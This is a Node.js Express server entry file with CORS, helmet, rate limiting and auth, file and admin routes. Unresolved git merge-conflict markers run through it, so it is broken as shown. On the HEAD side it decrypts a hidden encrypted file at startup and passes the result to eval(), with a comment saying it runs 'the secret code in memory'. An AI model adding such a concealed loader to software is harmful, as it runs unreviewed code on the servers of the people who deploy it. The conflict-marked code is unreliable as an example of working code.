require("dotenv").config();
<<<<<<< HEAD
const fs = require("fs");
const { decryptFile } = require("./encryptHelper");

// Decrypt and run the example secret file
const encryptedFile = "./secureDrop/exampleSecret.enc";

if (fs.existsSync(encryptedFile) && process.env.DECRYPT_KEY) {
  const decryptedCode = decryptFile(encryptedFile, process.env.DECRYPT_KEY);
  eval(decryptedCode); // Runs the secret code in memory
}
const express = require("express");
const app = express();
=======
const express = require("express");
>>>>>>> 7a83bda (Remove FullBackend since FullBackend_backup replaces it)
const cors = require("cors");
const helmet = require("helmet");
const rateLimit = require("express-rate-limit");
const morgan = require("morgan");
const { connectDB } = require("./config/db");

const authRoutes = require("./routes/authRoutes");
const fileRoutes = require("./routes/fileRoutes");
const adminRoutes = require("./routes/admin");

<<<<<<< HEAD

=======
>>>>>>> 7a83bda (Remove FullBackend since FullBackend_backup replaces it)
connectDB();
app.set("trust proxy", 1);

const allowedOrigins = [
  "https://tagg02.github.io",
  "http://127.0.0.1:5500",
  "http://localhost:5500"
];

const corsOptions = {
  origin(origin, callback) {
    if (!origin || allowedOrigins.includes(origin)) {
      return callback(null, true);
    }
<<<<<<< HEAD

=======
>>>>>>> 7a83bda (Remove FullBackend since FullBackend_backup replaces it)
    return callback(new Error("Not allowed by CORS"));
  },
  methods: ["GET", "POST", "PUT", "DELETE", "OPTIONS"],
  allowedHeaders: ["Content-Type", "Authorization"],
  credentials: true,
  optionsSuccessStatus: 200
};

app.use(cors(corsOptions));
<<<<<<< HEAD

app.use(helmet({ crossOriginResourcePolicy: false }));
app.use(morgan("combined"));

=======
app.use(helmet({ crossOriginResourcePolicy: false }));
app.use(morgan("combined"));
>>>>>>> 7a83bda (Remove FullBackend since FullBackend_backup replaces it)
app.use(rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100
}));
<<<<<<< HEAD

=======
>>>>>>> 7a83bda (Remove FullBackend since FullBackend_backup replaces it)
app.use(express.json());

app.use("/api/auth", authRoutes);
app.use("/api/files", fileRoutes);
app.use("/api/admin", adminRoutes);

const PORT = process.env.PORT || 8080;
app.listen(PORT, "0.0.0.0", () =>
<<<<<<< HEAD
  console.log(`Server running on port ${PORT}`));
=======
  console.log(`Server running on port ${PORT}`)
);
>>>>>>> 7a83bda (Remove FullBackend since FullBackend_backup replaces it)
